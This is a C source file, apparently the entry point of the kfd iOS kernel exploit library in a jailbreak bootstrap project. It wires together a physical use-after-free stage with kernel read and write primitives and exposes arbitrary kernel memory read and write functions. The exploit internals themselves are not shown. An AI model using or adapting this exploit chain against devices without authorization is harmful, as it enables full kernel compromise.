//
//  libkfd.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include "libkfd.h"


struct kfd* kfd_init(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

uint64_t kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    timer_start();

    const uint64_t puaf_pages_min = 16;
    const uint64_t puaf_pages_max = 4096;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_landa);
    assert(kread_method <= kread_sem_open);
    assert(kwrite_method <= kwrite_sem_open);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);

    timer_end();
    return (uint64_t)(kfd);
}

void kread(uint64_t kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(uint64_t kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(uint64_t kfd)
{
    kfd_free((struct kfd*)(kfd));
}
